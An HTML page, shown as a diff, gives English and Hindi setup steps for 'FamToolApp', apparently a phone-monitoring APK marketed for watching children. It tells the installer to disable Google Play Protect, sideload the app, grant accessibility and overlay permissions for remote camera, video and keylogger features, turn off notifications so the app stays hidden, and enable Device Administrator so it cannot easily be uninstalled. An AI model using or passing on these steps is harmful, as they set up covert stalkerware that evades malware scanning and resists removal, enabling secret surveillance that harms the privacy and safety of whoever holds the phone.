@@ -1,0 +1,292 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Install & Setup Guide - FamToolApp</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body { padding-top: 2rem; padding-bottom: 2rem; }
+        .container { max-width: 850px; margin: 0 auto; padding: 20px; }
+        .guide-card {
+            background: var(--primary-surface);
+            backdrop-filter: blur(12px); border: 1px solid var(--border-color);
+            border-radius: 12px; padding: 30px; margin-bottom: 20px;
+        }
+        h1, h2 { color: var(--accent-teal); margin-bottom: 15px; }
+        .lang-toggle { display: flex; gap: 10px; margin-bottom: 30px; justify-content: flex-end; }
+        .lang-btn {
+            background: var(--glass-surface); border: 1px solid var(--border-color);
+            color: var(--text-primary); padding: 8px 16px; border-radius: 6px; cursor: pointer;
+            font-family: inherit; font-size: 14px; transition: 0.3s;
+        }
+        .lang-btn.active { background: var(--accent-teal); color: var(--bg-main); font-weight: 600; }
+        .step { display: flex; margin-bottom: 25px; align-items: flex-start; }
+        .step-num {
+            background: var(--accent-blue); color: var(--bg-main); font-weight: bold;
+            width: 35px; height: 35px; border-radius: 50%; display: flex;
+            align-items: center; justify-content: center; flex-shrink: 0; margin-right: 15px;
+        }
+        .step-content h3 { margin-bottom: 8px; font-size: 1.1rem; color: #f8fafc; }
+        .step-content p, .step-content ul { color: var(--text-secondary); line-height: 1.6; }
+        .step-content ul { margin-top: 10px; padding-left: 20px; }
+        .step-content li { margin-bottom: 5px; }
+        .warning-box {
+            background: rgba(251, 113, 133, 0.1); border-left: 4px solid var(--accent-red);
+            padding: 15px; border-radius: 4px; margin-top: 15px; color: #fff;
+        }
+        .warning-box h4 { color: var(--accent-red); margin-bottom: 8px; }
+        .note-box {
+            background: rgba(45, 212, 191, 0.1); border-left: 4px solid var(--accent-teal);
+            padding: 15px; border-radius: 4px; margin-top: 15px; color: #fff;
+        }
+        .perm-box {
+            background: rgba(56, 189, 248, 0.05); border: 1px solid rgba(56, 189, 248, 0.2);
+            padding: 15px; border-radius: 8px; margin-bottom: 15px;
+        }
+        .perm-box h4 { color: var(--accent-blue); margin-bottom: 5px; }
+        .back-btn {
+            display: inline-flex; align-items: center; gap: 8px;
+            color: var(--text-secondary); text-decoration: none; margin-bottom: 20px;
+            transition: color 0.3s; font-weight: 500;
+        }
+        .back-btn:hover { color: var(--accent-teal); }
+    </style>
+</head>
+<body>
+    <div class="background-container"><div class="aurora-background"></div></div>
+    
+    <div class="container">
+        <a href="login-signup.html" class="back-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+            Back to Application
+        </a>
+
+        <div class="guide-card">
+            <div class="lang-toggle">
+                <button class="lang-btn active" onclick="setLang('en')">English</button>
+                <button class="lang-btn" onclick="setLang('hi')">हिंदी</button>
+            </div>
+            
+            <!-- ENGLISH CONTENT -->
+            <div id="content-en">
+                <h1>Complete Setup Guideline</h1>
+                <p style="color: var(--text-secondary); margin-bottom: 30px;">To ensure the app works properly in the background without interruptions, you must follow these exact instructions on your child's phone.</p>
+
+                <div class="step">
+                    <div class="step-num">1</div>
+                    <div class="step-content">
+                        <h3>Create Account & Verify Gmail (On Website)</h3>
+                        <p>First, you need to create your account on this website (Parent Panel).</p>
+                        <ul>
+                            <li>Go to the <strong>Sign Up</strong> page and create an account.</li>
+                            <li>You must <strong>verify your Gmail account</strong>. If the email is unverified, your account may be deleted.</li>
+                            <li>After verification, <strong>Log In</strong> to the dashboard.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">2</div>
+                    <div class="step-content">
+                        <h3>Disable Google Play Protect</h3>
+                        <p>Before downloading and installing the app, you MUST disable Google Play Protect on the child's phone.</p>
+                        <ul>
+                            <li>Open the <strong>Google Play Store</strong>.</li>
+                            <li>Tap the <strong>Profile Icon</strong> at the top right.</li>
+                            <li>Select <strong>Play Protect</strong> > Tap the <strong>Settings (Gear)</strong> icon.</li>
+                            <li>Turn OFF <strong>"Scan apps with Play Protect"</strong>.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">3</div>
+                    <div class="step-content">
+                        <h3>Download & Install the App</h3>
+                        <p>Now that Play Protect is disabled, proceed to install:</p>
+                        <ul>
+                            <li>While logged into the website dashboard, tap the <strong>"Download APK"</strong> button on the top navigation bar.</li>
+                            <li>Once downloaded, click on the APK file to install it.</li>
+                            <li>If asked, go to settings and enable <strong>"Allow from this source (Unknown Sources)"</strong>.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">4</div>
+                    <div class="step-content">
+                        <h3>Sign In to the App</h3>
+                        <p>Open the installed application on the child's phone.</p>
+                        <ul>
+                            <li><strong>Do NOT choose Sign Up</strong>. Your account is already created.</li>
+                            <li>Choose <strong>Sign In</strong>.</li>
+                            <li>Enter the exact Email and Password you registered with on the website.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">5</div>
+                    <div class="step-content">
+                        <h3>Crucial Permissions (CRITICAL)</h3>
+                        <p>The app will ask for permissions as part of the setup. <strong>It is mandatory to configure these properly</strong>, otherwise the app will stop working in the background.</p>
+
+                        <div class="perm-box">
+                            <h4>1. Draw over other apps (Display over other apps)</h4>
+                            <p><strong>Required:</strong> You must Turn this ON. Without this, the remote <u>Camera and Video features will not run</u> at all.</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>2. Accessibility Settings</h4>
+                            <p><strong>Required:</strong> This is highly essential. If not enabled, the background Camera, Video, Keylogger, and other core features can randomly stop working. 
+                            <br><br><strong>⚠️ Android 13/14/15/16 Note:</strong> If you see a "Restricted Setting" grey popup:<br>
+                            Go to phone <em>Settings > Apps > Click on the Application > Click the 3 dots (⋮) top-right > Allow restricted settings > Enter phone lock.</em> Then go back and enable Accessibility.</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>3. Auto-Start (Background Start)</h4>
+                            <p><strong>Required:</strong> You must allow Auto-Start. If you don't turn this on, the application will completely stop working in the background when the child closes it.</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>4. Battery Optimization</h4>
+                            <p><strong>Required:</strong> Set the Battery Saver or Optimization setting strictly to <strong>Unrestricted / No Restrictions</strong> so the phone's system doesn't kill the app automatically.</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>5. Disable Notifications</h4>
+                            <p><strong>Required:</strong> To ensure the app remains completely hidden, go to phone settings, open the app info, and <strong>Turn OFF all notifications</strong>.</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>6. Device Administrator (Optional)</h4>
+                            <p>If the app does not hide completely on your child's phone and you feel that the child might uninstall the application, you should activate Device Administrator during setup. This prevents the child from easily uninstalling the app.</p>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+            <!-- HINDI CONTENT -->
+            <div id="content-hi" style="display: none;">
+                <h1>ऐप सेट-अप एवं इंस्टॉलेशन गाइड</h1>
+                <p style="color: var(--text-secondary); margin-bottom: 30px;">बैकग्राउंड में बिना किसी रुकावट के ऐप को चलाने के लिए, आपको बच्चे के फोन पर नीचे दिए गए सभी नियमों का सख्ती से पालन करना होगा।</p>
+
+                <div class="step">
+                    <div class="step-num">1</div>
+                    <div class="step-content">
+                        <h3>अकाउंट बनाएं और Gmail वेरिफाई करें (वेबसाइट पर)</h3>
+                        <p>सबसे पहले आपको हमारी वेबसाइट (पेरेंट्स पैनल) पर अपना अकाउंट बनाना है।</p>
+                        <ul>
+                            <li><strong>Sign Up</strong> पेज पर जाएं और अकाउंट बनाएं।</li>
+                            <li>अकाउंट बनाने के बाद अपनी <strong>Gmail को वेरिफाई करना अनिवार्य है</strong>। यदि जीमेल वेरिफाई नहीं होता है तो आपका अकाउंट डिलीट किया जा सकता है।</li>
+                            <li>वेरिफाई करने के बाद वेबसाइट पर ही <strong>लॉग-इन (Log In)</strong> करें।</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">2</div>
+                    <div class="step-content">
+                        <h3>Play Protect को बंद करें</h3>
+                        <p>ऐप को डाउनलोड और इंस्टॉल करने से पहले बच्चे के फोन में Google Play Protect को बंद (Disable) करना बहुत ज़रूरी है।</p>
+                        <ul>
+                            <li>अपने फोन में <strong>Google Play Store</strong> खोलें।</li>
+                            <li>ऊपर दाईं ओर अपने <strong>Profile Icon</strong> पर क्लिक करें।</li>
+                            <li><strong>Play Protect</strong> चुनें > फिर ऊपर <strong>Settings (गियर आइकॉन)</strong> पर क्लिक करें।</li>
+                            <li><strong>"Scan apps with Play Protect"</strong> को बंद (Turn OFF) कर दें।</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">3</div>
+                    <div class="step-content">
+                        <h3>ऐप डाउनलोड और इंस्टॉल करें</h3>
+                        <p>प्ले प्रोटेक्ट बंद करने के बाद ऐप को इंस्टॉल करें:</p>
+                        <ul>
+                            <li>साइन-इन करने के बाद वेबसाइट के ऊपर नेविगेशन (Nav) बार में दिए गए <strong>"Download APK"</strong> बटन पर क्लिक करके ऐप डाउनलोड करें।</li>
+                            <li>डाउनलोड पूरा होने के बाद APK फाइल पर क्लिक कर इसे इंस्टॉल करें।</li>
+                            <li>अगर फोन "Install unknown apps" की अनुमति मांगे तो Settings में जाकर <strong>"Allow from this source"</strong> को On कर दें।</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">4</div>
+                    <div class="step-content">
+                        <h3>ऐप में Sign In करें</h3>
+                        <p>ऐप इंस्टॉल होने के बाद बच्चे के फोन में इसे खोलें:</p>
+                        <ul>
+                            <li>यहाँ आपको <strong>Sign Up नहीं करना है</strong> क्योंकि आपका अकाउंट पहले ही बन चुका है।</li>
+                            <li>केवल <strong>Sign In</strong> पर क्लिक करें।</li>
+                            <li>वेबसाइट पर रजिस्टर की गई <strong>Email और Password</strong> डालकर लॉग-इन करें।</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">5</div>
+                    <div class="step-content">
+                        <h3>अनिवार्य परमिशन्स (Permissions) सेटिंग्स</h3>
+                        <p>ऐप सेटअप करते समय सारी परमिशन सही से देना ज़रूरी है। <strong>यदि आप इनमें से कुछ छोड़ देते हैं, तो ऐप बैकग्राउंड में काम करना बंद कर देगा।</strong></p>
+
+                        <div class="perm-box">
+                            <h4>1. Draw over other apps (डिस्प्ले ओवर अदर ऐप्स)</h4>
+                            <p><strong>अनिवार्य:</strong> इसे On करना बहुत जरूरी है। इसके बिना ऐप पर रिमोट कैमरा (Camera) और वीडियो (Video) बिल्कुल नहीं चलेगी।</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>2. Accessibility (एक्सेसिबिलिटी)</h4>
+                            <p><strong>अति आवश्यक:</strong> इसे ऑन करना अनिवार्य है। अगर यह परमिशन नहीं दी जाती है, तो बैकग्राउंड में कैमरा, वीडियो और कीलॉगर (Keylogger) काम करना बंद कर सकते हैं। 
+                            <br><br><strong>⚠️ Android 13/14/15/16 के लिए नोट:</strong> अगर आपको "Restricted Setting" का अलर्ट दिखे तो यह करें:<br>
+                            फोन की <em>Settings > Apps > इंस्टॉल की गई एप्लीकेशन पर क्लिक करें > ऊपर 3 डॉट्स (⋮) दबाएं > Allow restricted settings पर क्लिक करें > फोन का लॉक डालें।</em> फिर वापस आकर Accessibility चालू करें।</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>3. Auto-Start (ऑटो-स्टार्ट / बैकग्राउंड रन)</h4>
+                            <p><strong>अनिवार्य:</strong> ऑटो-स्टार्ट को चालू करना बहुत जरूरी है। यदि आप इसे चालू नहीं करते हैं तो ऐप कुछ देर बाद बैकग्राउंड में रुक (Stop) सकती है।</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>4. Battery Optimization (बैटरी ऑप्शन)</h4>
+                            <p><strong>अनिवार्य:</strong> फोन का बैटरी सेवर ऐप को बंद न कर दे, इसके लिए बैटरी सेटिंग में जाकर <strong>Unrestricted</strong> या <strong>No Restrictions</strong> का चयन करें।</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>5. Notifications बंद करें</h4>
+                            <p><strong>अनिवार्य:</strong> अगर आप चाहते हैं कि ऐप फोन में बिल्कुल छिपी (Hidden) रहे, तो फोन की सेटिंग से इस ऐप की सभी <strong>Notificaitons को Turn OFF (बंद)</strong> कर दें।</p>
+                        </div>
+
+                        <div class="perm-box">
+                            <h4>6. Device Administrator (ऑप्शनल / ऐच्छिक)</h4>
+                            <p>अगर आपके बच्चे के मोबाइल में एप्लीकेशन हाइड (Hide) नहीं होती है और आपको लगता है कि बच्चा ऐप को अनइंस्टॉल कर देगा, तो सेटअप के समय आप <strong>Device Administrator</strong> को भी एक्टिव कर सकते हैं। ऐसा करने से बच्चा आसानी से ऐप को अनइंस्टॉल नहीं कर पाएगा।</p>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function setLang(lang) {
+            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
+            if(lang === 'en') {
+                document.getElementById('content-hi').style.display = 'none';
+                document.getElementById('content-en').style.display = 'block';
+                document.querySelector('.lang-btn:nth-child(1)').classList.add('active');
+            } else {
+                document.getElementById('content-en').style.display = 'none';
+                document.getElementById('content-hi').style.display = 'block';
+                document.querySelector('.lang-btn:nth-child(2)').classList.add('active');
+            }
+        }
+    </script>
+</body>
+</html>
